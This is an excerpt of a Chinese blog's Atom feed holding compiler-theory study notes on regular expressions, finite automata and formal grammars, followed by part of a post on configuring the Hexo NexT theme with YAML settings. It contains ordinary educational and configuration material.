    <published>2017-09-16T09:46:00.000Z</published>
    <updated>2017-10-27T01:53:29.778Z</updated>
    
    <content type="html"><![CDATA[<p>记录</p>
<a id="more"></a>
<hr>
<h2 id="正则表达式-Regular-Expression，RE"><a href="#正则表达式-Regular-Expression，RE" class="headerlink" title="正则表达式 ( Regular Expression，RE )"></a>正则表达式 ( Regular Expression，RE )</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul>
<li>是一种用来描述正则语言的更紧凑的表示方法。</li>
<li>正则表达式可以由较小的正则表达式按照特定规则<strong>递归</strong>地构建。</li>
<li>每个正则表达式 <strong>r</strong> 定义(表示)一个语言，记为 <strong>L(r)</strong> 。</li>
</ul>
<hr>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul>
<li>ε是一个RE，L(ε) = {ε}</li>
<li>如果 a∈∑，则a是一个RE，L(a) = {a}</li>
<li>假设 <strong>r</strong> 和 <strong>s</strong> 都是RE，表示的语言分别是 <strong>L(r)</strong> 和 <strong>L(s)</strong> ，则<ul>
<li>r|s 是一个RE，L( r|s ) = L(r)∪L(s)</li>
<li>rs 是一个RE，L( rs ) = L(r) L(s)</li>
<li>r* 是一个RE，L( r* )= (L(r))*</li>
<li>(r) 是一个RE，L( (r) ) = L(r)</li>
</ul>
</li>
</ul>
<hr>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>C语言无符号整数的RE</p>
<ul>
<li>十进制整数的RE - (1|…|9)(0|…|9)*|0</li>
<li>八进制整数的RE - 0(0|1|2|3|4|5|6|7)(0|1|2|3|4|5|6|7)*</li>
<li>十六进制整数的RE - 0x(0|1|…|9|a|…| f |A|…|F)(0|…|9|a|…| f |A|…|F )*</li>
</ul>
<hr>
<h3 id="代数定律"><a href="#代数定律" class="headerlink" title="代数定律"></a>代数定律</h3><table>
<thead>
<tr>
<th>定律</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>r｜s = s｜r</td>
<td>｜是可以交换的</td>
</tr>
<tr>
<td>r｜( s｜t )=( r｜s )｜t</td>
<td>｜是可结合的</td>
</tr>
<tr>
<td>r(s t)=( r s)t</td>
<td>连接是可结合的</td>
</tr>
<tr>
<td>r ( s｜t )= r s｜r t ; &nbsp;&nbsp;&nbsp; ( s｜t ) r = sr｜t r</td>
<td>连接对｜是可分配的</td>
</tr>
<tr>
<td>εr = rε = r</td>
<td>ε 是连接的单位元</td>
</tr>
<tr>
<td>r* = ( r｜ε )*</td>
<td>闭包中一定包含 ε</td>
</tr>
<tr>
<td>r* * = r*</td>
<td>* 具有幂等性</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="单词的识别"><a href="#单词的识别" class="headerlink" title="单词的识别"></a>单词的识别</h2><h3 id="有穷自动机-Finite-Automata，FA"><a href="#有穷自动机-Finite-Automata，FA" class="headerlink" title="有穷自动机 ( Finite Automata，FA )"></a>有穷自动机 ( Finite Automata，FA )</h3><ul>
<li>具有一系列<strong>离散的输入输出信息</strong>和<strong>有穷数目的内部状态</strong>。</li>
<li>系统只需要根据<strong>当前所处的状态</strong>和<strong>当前面临的输入信息</strong>就可以决定系统的<strong>后继行为</strong>。</li>
<li>每当系统处理了当前的输入后，系统的内部状态也将<strong>发生改变</strong>。</li>
</ul>
<h4 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h4><p><img src="/images/20170916182343.jpg" width="500"></p>
<ul>
<li>输入带(input tape)：用来存放输入符号串。</li>
<li>读头(head )：从左向右逐个读取输入符号，不能修改（只读）、不能往返移动。</li>
<li>有穷控制器( finite control )：具有有穷个状态数，根据<strong>当前的状态</strong>和<strong>当前输入符号</strong>控制转入<strong>下一状态</strong>。</li>
</ul>
<h4 id="表示：转换图-Transition-Graph"><a href="#表示：转换图-Transition-Graph" class="headerlink" title="表示：转换图 ( Transition Graph )"></a>表示：转换图 ( Transition Graph )</h4><p><img src="/images/20170916183203.jpg" width="500"></p>
<ul>
<li>结点：FA的状态<ul>
<li>初始状态（开始状态）：<strong>只有一个</strong>，由start箭头指向。</li>
<li>终止状态（接收状态）：可以有多个，用<strong>双圈</strong>表示。</li>
</ul>
</li>
<li>带标记的有向边：如果对于输入 <strong>a</strong> ，存在一个从状态 <strong>p</strong> 到状态 <strong>q</strong> 的转换，就在 <strong>p</strong> 、 <strong>q</strong> 之间画一条有向边，并标记上 <strong>a</strong> 。</li>
</ul>
<h4 id="接收的语言"><a href="#接收的语言" class="headerlink" title="接收的语言"></a>接收的语言</h4><ul>
<li>给定输入串 <strong>x</strong> ，如果存在一个对应于串 <strong>x</strong> 的从初始状态到某个终止状态的转换序列，则称串 <strong>x</strong> 被该FA接收。</li>
<li>由一个有穷自动机M接收的所有串构成的集合称为是该<strong>FA定义（或接收）的语言</strong>，记为 <strong>L( M )</strong>。</li>
</ul>
<p><img src="/images/20170916183203.jpg" width="500"></p>
<blockquote>
<p>L(M) = 所有以abb结尾的字母表{a, b}上的串的集合</p>
</blockquote>
<h4 id="最长子串匹配原则"><a href="#最长子串匹配原则" class="headerlink" title="最长子串匹配原则"></a>最长子串匹配原则</h4><p>当输入串的多个前缀与一个或多个模式匹配时，总是选择最长的前缀进行匹配。</p>
<hr>
<h3 id="有穷自动机的分类"><a href="#有穷自动机的分类" class="headerlink" title="有穷自动机的分类"></a>有穷自动机的分类</h3><ul>
<li>确定的FA (Deterministic finite automata, DFA)</li>
<li>非确定的FA (Nondeterministic finite automata, NFA)</li>
</ul>
<h4 id="DFA"><a href="#DFA" class="headerlink" title="DFA"></a>DFA</h4><p>对任意的字符，最多有一个状态可以转移。</p>
<p><strong>M = ( S，Σ ，δ，s0，F )</strong></p>
<ul>
<li>S：有穷状态集。</li>
<li>Σ：输入字母表，即输入符号集合。假设 <strong>ε</strong> 不是 Σ 中的元素。</li>
<li>δ：将S×Σ映射到S的<strong>转换函数</strong>。∀s∈S, a∈Σ, <strong>δ(s,a)</strong> 表示从状态s出发，沿着标记为a的边所能到达的状态。</li>
<li>s0：开始状态 (或初始状态)，s0∈ S。</li>
<li>F：接收状态（或终止状态）集合，F⊆ S。</li>
</ul>
<p><img src="/images/DFA.png" width="500"></p>
<blockquote>
<p>r = (a|b)*abb</p>
</blockquote>
<hr>
<h4 id="NFA"><a href="#NFA" class="headerlink" title="NFA"></a>NFA</h4><p>对任意的字符，有多于一个状态可以转移。</p>
<p><strong>M = ( S，Σ ，δ，s0，F )</strong></p>
<ul>
<li>S：有穷状态集。</li>
<li>Σ：输入字母表，即输入字母表。假设 <strong>ε</strong> 不是 Σ 中的元素。</li>
<li>δ：将S×Σ映射到2^S的<strong>转换函数</strong>。s∈S, a∈Σ, <strong>δ(s,a)</strong>表示从状态s出发，沿着标记为a的边所能到达的状态集合。</li>
<li>s0：开始状态 (或初始状态)，s0∈ S。</li>
<li>F：接收状态（或终止状态）集合，F⊆ S。</li>
</ul>
<p><img src="/images/NFA.png" width="500"></p>
<blockquote>
<p>r = (a|b)*abb</p>
</blockquote>
<hr>
<h4 id="等价性"><a href="#等价性" class="headerlink" title="等价性"></a>等价性</h4><blockquote>
<p>对任何非确定的有穷自动机N ，存在定义同一语言的确定的有穷自动机D<br>对任何确定的有穷自动机D ，存在定义同一语言的非确定的有穷自动机N</p>
</blockquote>
<hr>
<h4 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a>主要区别</h4><ul>
<li>对于DFA，一个特定的符号输入，有且只能得到一个状态，而NFA就有可能得到一个状态集。因此NFA引擎必须记录所有的可能路径。</li>
<li>DFA比较快，但不提供Backtrack（回溯）功能，NFA比较慢，但提供了Backtrack功能。</li>
</ul>
<hr>
<h4 id="DFA的算法实现"><a href="#DFA的算法实现" class="headerlink" title="DFA的算法实现"></a>DFA的算法实现</h4><p>由于DFA对于特定输入，状态是确定的，因此实现起来很方便。</p>
<ul>
<li>输入：以文件结束符<strong>eof</strong>结尾的字符串<strong>x</strong>。DFA <strong>D</strong>的开始状态<strong>s0</strong>，接收状态集<strong>F</strong>，转换函数<strong>move</strong>。</li>
<li>输出：如果<strong>D</strong>接收<strong>x</strong>，则回答“yes”，否则回答“no”。</li>
<li>方法：将下述算法应用于输入串<strong>x</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">s = s0;</div><div class="line">c = next_char();</div><div class="line">while (c != eof) &#123;</div><div class="line">	s = move(s, c);</div><div class="line">	c = next_char();</div><div class="line">&#125;</div><div class="line">if (s is in F)</div><div class="line">	return &quot;yes&quot;;</div><div class="line">else</div><div class="line">	return &quot;no&quot;;</div></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h3 id="RE转换成NFA"><a href="#RE转换成NFA" class="headerlink" title="RE转换成NFA"></a>RE转换成NFA</h3><h4 id="ε"><a href="#ε" class="headerlink" title="ε"></a>ε</h4><p><img src="/images/20171024144829.png" width="400"></p>
<h4 id="字母表Σ中符号a"><a href="#字母表Σ中符号a" class="headerlink" title="字母表Σ中符号a"></a>字母表Σ中符号a</h4><p><img src="/images/20171024144915.png" width="400"></p>
<h4 id="r-r1r2"><a href="#r-r1r2" class="headerlink" title="r = r1r2"></a>r = r1r2</h4><p><img src="/images/20171024145410.png" width="500"></p>
<h4 id="r-r1-r2"><a href="#r-r1-r2" class="headerlink" title="r = r1|r2"></a>r = r1|r2</h4><p><img src="/images/20171024145504.png" width="400"></p>
<h4 id="r-r1"><a href="#r-r1" class="headerlink" title="r = (r1)*"></a>r = (r1)*</h4><p><img src="/images/20171024145520.png" width="200"></p>
<hr>
<blockquote>
<p>r=(a|b)*abb 对应的NFA</p>
</blockquote>
<p><img src="/images/20171024150046.png" width="500"></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录&lt;/p&gt;
    
    </summary>
    
      <category term="原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/"/>
    
      <category term="编译原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="原理" scheme="http://gaufoo.com/tags/%E5%8E%9F%E7%90%86/"/>
    
      <category term="编译原理" scheme="http://gaufoo.com/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>编译原理学习笔记（一）</title>
    <link href="http://gaufoo.com/2017/09/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://gaufoo.com/2017/09/10/编译原理学习笔记（一）/</id>
    <published>2017-09-09T17:52:49.000Z</published>
    <updated>2017-09-16T10:05:05.373Z</updated>
    
    <content type="html"><![CDATA[<p>记录</p>
<a id="more"></a>
<hr>
<h2 id="文法的形式化定义"><a href="#文法的形式化定义" class="headerlink" title="文法的形式化定义"></a>文法的形式化定义</h2><p><strong>G = (V<sub>T</sub>, V<sub>N</sub>, P , S )</strong></p>
<h3 id="各成分含义"><a href="#各成分含义" class="headerlink" title="各成分含义"></a>各成分含义</h3><ul>
<li>V<sub>T</sub>：终结符集合<ul>
<li>终结符（terminal symbol）是文法所定义的语言的<strong>基本符号</strong>，有时也称为token</li>
<li>例：V<sub>T</sub> = { apple, boy, eat, little }</li>
</ul>
</li>
<li><p>V<sub>N</sub>：非终结符集合</p>
<ul>
<li>非终结符 ( nonterminal ) 是用来表示<strong>语法成分</strong>的符号，有时也称为“语法变量”</li>
<li><p>例: V<sub>N</sub> = { &lt;句子&gt;, &lt;名词短语&gt;, &lt;动词短语&gt;, &lt;名词&gt;, … }</p>
<blockquote>
<p>V<sub>T</sub> ∩ V<sub>N</sub> = Φ<br>V<sub>T</sub> ∪ V<sub>N</sub> = 文法符号集</p>
</blockquote>
</li>
</ul>
</li>
<li><p>P：产生式集合</p>
<ul>
<li>产生式 ( production ) 描述了将终结符和非终结符组合成串的方法</li>
<li>产生式的一般形式： <strong>α→β</strong> ，读作：α定义为β<ul>
<li>α∈(V<sub>T</sub> ∪ V<sub>N</sub> )<sup>+</sup>，且α中至少包含V<sub>N</sub>中的一个元素：称为产生式的头 ( head ) 或左部 ( left side )</li>
<li>β∈(V<sub>T</sub> ∪ V<sub>N</sub> )<sup>*</sup>：称为产生式的体(body)或右部(right side)</li>
</ul>
</li>
<li>例：{&lt;句子&gt;→&lt;名词短语&gt;&lt;动词短语&gt;,&lt;名词短语&gt;→&lt;形容词&gt;&lt;名词短语&gt;,……}</li>
</ul>
</li>
<li>S：开始符号<ul>
<li>S∈V<sub>N</sub> 。开始符号 ( start symbol ) 表示的是该文法中<strong>最大</strong>的语法成分</li>
<li>例：S = &lt;句子&gt;</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li><p>例子：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">G = (&#123;id, +, *, (, )&#125;, &#123;E&#125;, P, E)</div><div class="line">P = &#123;	E → E + E,</div><div class="line">	E → E * E,</div><div class="line">	E → ( E ),</div><div class="line">	E → id&#125;</div></pre></td></tr></table></figure>
<p>  约定：不引起歧义的前提下，可以只写产生式</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">G : 	E → E + E</div><div class="line">	E → E * E</div><div class="line">	E → ( E )</div><div class="line">	E → id</div></pre></td></tr></table></figure>
<p>  简写：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">G : E → E + E | E * E | ( E ) | id</div></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h3 id="符号约定"><a href="#符号约定" class="headerlink" title="符号约定"></a>符号约定</h3><ul>
<li>终结符<ul>
<li>字母表中排在前面的小写字母，如 a、b、c</li>
<li>运算符，如 +、*等</li>
<li>标点符号，如括号、逗号等</li>
<li>数字 0、1、… 、9</li>
<li>粗体字符串，如<strong>id</strong>、<strong>if</strong>等</li>
</ul>
</li>
<li>非终结符<ul>
<li>字母表中排在前面的大写字母，如A、B、C</li>
<li>字母S。通常表示开始符号</li>
<li>小写、斜体的名字，如 <em>expr</em>、<em>stmt</em>等</li>
<li>代表程序构造的大写字母。如E(表达式)、T(项)和F(因子)</li>
</ul>
</li>
<li>文法符号（即终结符或非终结符）<ul>
<li>字母表中排在后面的大写字母（如X、Y、Z）</li>
</ul>
</li>
<li>终结符号串<ul>
<li>字母表中排在后面的小写字母（主要是u、v、… 、z）</li>
</ul>
</li>
<li>文法符号串<ul>
<li>小写希腊字母，如α、β、γ</li>
</ul>
</li>
<li>除非特别说明，第一个产生式的左部就是开始符号</li>
</ul>
<hr>
<h2 id="语言的定义"><a href="#语言的定义" class="headerlink" title="语言的定义"></a>语言的定义</h2><h3 id="推导和归约"><a href="#推导和归约" class="headerlink" title="推导和归约"></a>推导和归约</h3><p>用产生式的右部替换产生式的左部，称为推导 (Derivations) </p>
<blockquote>
<p>如果α0=&gt;α1，α1=&gt;α2，α2=&gt;α3，…，α n-1=&gt;αn，则可以记作α0=&gt;α1=&gt;α2=&gt;α3=&gt; …=&gt; α n-1=&gt;αn，称符号串 α0经过n步推导出αn，可简记为α0=&gt;<sup>n</sup>αn</p>
</blockquote>
<p>用产生式的左部替换产生式的右部，称为归约 (Reductions)<br>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;句子&gt; =&gt; &lt;名词短语&gt;&lt;动词短语&gt;</div><div class="line">       =&gt; &lt;形容词&gt;&lt;名词短语&gt;&lt;动词短语&gt;</div><div class="line">       =&gt; little &lt;名词短语&gt;&lt;动词短语&gt;</div><div class="line">       =&gt; little &lt;名词&gt;&lt;动词短语&gt;</div><div class="line">       =&gt; little boy &lt;动词短语&gt;</div><div class="line">       =&gt; little boy &lt;动词&gt;&lt;名词短语&gt;</div><div class="line">       =&gt; little boy eats &lt;名词短语&gt;</div><div class="line">       =&gt; little boy eats &lt;名词&gt;</div><div class="line">       =&gt; little boy eats apple</div></pre></td></tr></table></figure></p>
<p>由上往下是推导，由下往上是归约</p>
<hr>
<h3 id="句型和句子"><a href="#句型和句子" class="headerlink" title="句型和句子"></a>句型和句子</h3><ul>
<li>如果 S=&gt;*α, α∈(V<sub>T</sub>∪V<sub>N</sub>)*，则称α是G的一个句型(sentential form)</li>
<li>如果 S=&gt;*w，w∈V<sub>T</sub>*，则称w是G的一个句子(sentence)</li>
</ul>
<blockquote>
<p>句子是不包含<strong>非终结符</strong>的句型</p>
</blockquote>
<ul>
<li>由文法G的开始符号S推导出的所有<strong>句子</strong>构成的集合称为文法G生成的<strong>语言</strong>，记为L(G)。</li>
</ul>
<hr>
<h2 id="Chomsky-文法分类体系"><a href="#Chomsky-文法分类体系" class="headerlink" title="Chomsky 文法分类体系"></a>Chomsky 文法分类体系</h2><h3 id="0型文法-Type-0-Grammar"><a href="#0型文法-Type-0-Grammar" class="headerlink" title="0型文法 (Type-0 Grammar)"></a>0型文法 (Type-0 Grammar)</h3><ul>
<li>无限制文法(Unrestricted Grammar) / 短语结构文法(Phrase Structure Grammar, PSG )<ul>
<li>∀α → β∈P， α中至少包含1个非终结符</li>
</ul>
</li>
</ul>
<blockquote>
<p>PSG中可包含ε-产生式</p>
</blockquote>
<hr>
<h3 id="1型文法-Type-1-Grammar"><a href="#1型文法-Type-1-Grammar" class="headerlink" title="1型文法 (Type-1 Grammar)"></a>1型文法 (Type-1 Grammar)</h3><ul>
<li>上下文有关文法(Context-Sensitive Grammar , CSG )<ul>
<li>∀α → β∈P，｜α｜≤｜β｜</li>
<li>产生式的一般形式： α1Aα2 → α1βα2 ( β≠ε )</li>
</ul>
</li>
</ul>
<blockquote>
<p>CSG中不包含ε-产生式</p>
</blockquote>
<hr>
<h3 id="2型文法-Type-2-Grammar"><a href="#2型文法-Type-2-Grammar" class="headerlink" title="2型文法 (Type-2 Grammar)"></a>2型文法 (Type-2 Grammar)</h3><ul>
<li>上下文无关文法 (Context-Free Grammar, CFG )<ul>
<li>∀α → β∈P，α ∈ V<sub>N</sub></li>
<li>产生式的一般形式：A→β</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3型文法-Type-3-Grammar"><a href="#3型文法-Type-3-Grammar" class="headerlink" title="3型文法 (Type-3 Grammar)"></a>3型文法 (Type-3 Grammar)</h3><ul>
<li>正则文法 (Regular Grammar, RG )<ul>
<li>右线性(Right Linear)文法： A→wB 或 A→w</li>
<li>左线性(Left Linear) 文法： A→Bw 或 A→w</li>
</ul>
</li>
</ul>
<hr>
<h3 id="四种文法之间的关系"><a href="#四种文法之间的关系" class="headerlink" title="四种文法之间的关系"></a>四种文法之间的关系</h3><p>逐级限制：</p>
<ul>
<li>0型文法：α中至少包含1个非终结符</li>
<li>1型文法（CSG） ：｜α｜≤｜β｜</li>
<li>2型文法（CFG） ：α ∈ V<sub>N</sub></li>
<li>3型文法（RG）：A→wB 或 A→w (A→Bw 或A→w)</li>
</ul>
<hr>
<h2 id="CFG的分析树"><a href="#CFG的分析树" class="headerlink" title="CFG的分析树"></a>CFG的分析树</h2><h3 id="分析树举例"><a href="#分析树举例" class="headerlink" title="分析树举例"></a>分析树举例</h3><p><img src="/images/229534388000563683.jpg" width="500"></p>
<ul>
<li>分析树是推导的图形化表示<br>  推导过程：E =&gt; -E =&gt; - ( E ) =&gt; - ( E+E ) =&gt; - ( id+E ) =&gt; - ( id+id )</li>
<li>结构<ul>
<li><strong>根节点</strong>的标号为<strong>文法开始符号</strong></li>
<li><strong>内部结点</strong>表示对一个产生式A→β的应用，该结点的标号是此产生式左部<strong>A</strong>。该结点的子结点的标号从左到右构成了产生式的右部<strong>β</strong></li>
<li><strong>叶结点</strong>的标号既可以是非终结符，也可以是终结符。从左到右排列叶节点得到的符号串称为是这棵树的产出(yield)或边缘(frontier)</li>
</ul>
</li>
</ul>
<hr>
<h3 id="二义性文法"><a href="#二义性文法" class="headerlink" title="二义性文法"></a>二义性文法</h3><p>如果一个文法可以为某个句子生成多棵分析树，则称这个文法是二义性的</p>
<p>例：<br>文法：S → <strong>if</strong> E <strong>then</strong> S | <strong>if</strong> E <strong>then</strong> S <strong>else</strong> S | <strong>other</strong><br>句型：<strong>if</strong> E1 <strong>then</strong> <strong>if</strong> E2 <strong>then</strong> S1 <strong>else</strong> S2<br>    可生成的分析树有：<br><img src="/images/728669562437023693.jpg" width="500"></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录&lt;/p&gt;
    
    </summary>
    
      <category term="原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/"/>
    
      <category term="编译原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="原理" scheme="http://gaufoo.com/tags/%E5%8E%9F%E7%90%86/"/>
    
      <category term="编译原理" scheme="http://gaufoo.com/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Hexo下的NexT主题配置（下）</title>
    <link href="http://gaufoo.com/2017/09/06/Hexo%E4%B8%8B%E7%9A%84NexT%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>http://gaufoo.com/2017/09/06/Hexo下的NexT主题配置（下）/</id>
    <published>2017-09-06T09:40:00.000Z</published>
    <updated>2017-09-06T12:51:52.367Z</updated>
    
    <content type="html"><![CDATA[<p>上期链接：<a href="http://gaufoo.com/2017/08/23/Hexo下的NexT主题配置（上）/">http://gaufoo.com/2017/08/23/Hexo下的NexT主题配置（上）/</a></p>
<a id="more"></a>
<hr>
<h2 id="文章设置"><a href="#文章设置" class="headerlink" title="文章设置"></a>文章设置</h2><h3 id="直达余下全文"><a href="#直达余下全文" class="headerlink" title="直达余下全文"></a>直达余下全文</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">scroll_to_more:</span> <span class="literal">false</span></div></pre></td></tr></table></figure>
<p>点击阅读全文后，是否直达 <code>&lt;!--more--&gt;</code> 后的余下全文位置。</p>
<h3 id="保存页面位置"><a href="#保存页面位置" class="headerlink" title="保存页面位置"></a>保存页面位置</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">save_scroll:</span> <span class="literal">false</span></div></pre></td></tr></table></figure>
<p>是否在cookies里为每个页面保存阅读位置。</p>
<h3 id="自动序言"><a href="#自动序言" class="headerlink" title="自动序言"></a>自动序言</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></div></pre></td></tr></table></figure>
<p>主页显示文章是否自动摘录描述作为序言。</p>
<h3 id="截取序言"><a href="#截取序言" class="headerlink" title="截取序言"></a>截取序言</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attr">auto_excerpt:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  length:</span> <span class="number">150</span></div></pre></td></tr></table></figure>
<p>不建议开启，推荐使用 <code>&lt;!--more--&gt;</code> 来精确控制序言。</p>
<h3 id="作者信息"><a href="#作者信息" class="headerlink" title="作者信息"></a>作者信息</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attr">post_meta:</span></div><div class="line"><span class="attr">  item_text:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  created_at:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  updated_at:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  categories:</span> <span class="literal">true</span></div></pre></td></tr></table></figure>
<p><code>created_at</code>：是否显示创建时间，<code>updated_at</code>：是否显示更新时间， <code>categories</code>：是否显示分类目录。</p>
<h3 id="字数统计信息"><a href="#字数统计信息" class="headerlink" title="字数统计信息"></a>字数统计信息</h3><p>启动功能需要下载插件：<a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="external">https://github.com/willin/hexo-wordcount</a><br><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="attr">post_wordcount:</span></div><div class="line"><span class="attr">  item_text:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  wordcount:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  min2read:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  totalcount:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  separated_meta:</span> <span class="literal">false</span></div></pre></td></tr></table></figure></p>
<p><code>wordcount</code>：开启字数统计，<code>min2read</code>：开启大致阅读时间，<code>totalcount</code>：开启所有文章总字体显示，<code>separated_meta</code>：开启独占一行。</p>
<h3 id="微信二维码"><a href="#微信二维码" class="headerlink" title="微信二维码"></a>微信二维码</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">wechat_subscriber:</span></div><div class="line"><span class="attr">  enabled:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  qcode:</span> <span class="string">/path/to/your/wechatqcode</span> <span class="string">ex.</span> <span class="string">/uploads/wechat-qcode.jpg</span></div><div class="line"><span class="attr">  description:</span> <span class="string">ex.</span> <span class="string">subscribe</span> <span class="string">to</span> <span class="string">my</span> <span class="string">blog</span> <span class="string">by</span> <span class="string">scanning</span> <span class="string">my</span> <span class="string">public</span> <span class="string">wechat</span> <span class="string">account</span></div></pre></td></tr></table></figure>
<p><code>enabled</code>：文末是否开启微信二维码显示，<code>qcode</code>：二维码图片所在路径，示例: <code>/uploads/wechat-qcode.jpg</code>，<code>description</code>：二维码底下的简要描述文字。</p>
<h3 id="打赏"><a href="#打赏" class="headerlink" title="打赏"></a>打赏</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">reward_comment:</span> <span class="string">您的支持将鼓励我继续创作！</span></div><div class="line"><span class="attr">wechatpay:</span> <span class="string">/images/wechatpay.jpg</span></div><div class="line"><span class="attr">alipay:</span> <span class="string">/images/alipay.jpg</span></div><div class="line"><span class="attr">bitcoin:</span> <span class="string">/images/bitcoin.png</span></div></pre></td></tr></table></figure>
<p><code>reward_comment</code>：打赏提示性语句，<code>wechatpay</code>：微信支付二维码图片存储路径，<code>alipay</code>：支付宝二维码图片存储路径，<code>bitcoin</code>：比特币支付二维码图片存储路径。</p>
<h3 id="文章版权声明"><a href="#文章版权声明" class="headerlink" title="文章版权声明"></a>文章版权声明</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">post_copyright:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  license:</span> <span class="string">CC</span> <span class="string">BY-NC-ND</span> <span class="number">3.0</span></div><div class="line"><span class="attr">  license_url:</span> <span class="attr">https://creativecommons.org/licenses/by-nc-nd/3.0/</span></div></pre></td></tr></table></figure>
<p><code>enable</code>：开启版权声明提醒，<code>license</code>：版权声明类型，<code>license_url</code>：全球版权页</p>
<hr>
<h2 id="Misc-主题方案设置"><a href="#Misc-主题方案设置" class="headerlink" title="Misc 主题方案设置"></a>Misc 主题方案设置</h2><h3 id="移动设备减少边框"><a href="#移动设备减少边框" class="headerlink" title="移动设备减少边框"></a>移动设备减少边框</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">mobile_layout_economy:</span> <span class="literal">false</span></div></pre></td></tr></table></figure>
<p>不建议true</p>
<h3 id="安卓设备面板颜色"><a href="#安卓设备面板颜色" class="headerlink" title="安卓设备面板颜色"></a>安卓设备面板颜色</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">android_chrome_color:</span> <span class="string">"#222"</span></div></pre></td></tr></table></figure>
<h3 id="代码高亮主题"><a href="#代码高亮主题" class="headerlink" title="代码高亮主题"></a>代码高亮主题</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">highlight_theme:</span> <span class="string">normal</span></div></pre></td></tr></table></figure>
